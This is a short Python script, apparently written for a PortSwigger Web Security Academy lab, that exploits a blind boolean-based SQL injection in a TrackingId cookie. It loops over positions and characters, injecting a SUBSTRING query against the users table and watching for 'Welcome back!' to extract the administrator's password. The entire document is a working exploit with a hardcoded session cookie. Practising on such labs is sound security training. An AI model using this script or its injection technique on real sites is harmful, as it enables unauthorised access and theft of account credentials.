import requests
import string

url = "https://0ab000930482638f80ffb226009500a4.web-security-academy.net/login"
characters = [i for i in range(10)]
characters += list(string.ascii_lowercase)
password = ""
for number in range(1, 21):
    for character in characters:
        response = requests.get(url, cookies={"session": "flhUcIripYvilZs5BDyR2sIMzN1qGQuy", "TrackingId": f"tqhSLrizdP38c2NI' AND (SELECT SUBSTRING(password,{number},1) FROM users WHERE username='administrator')='{character}"})
        if "Welcome back!" in response.text:
            password += str(character)
            print(password, number, character)
            break

print(password)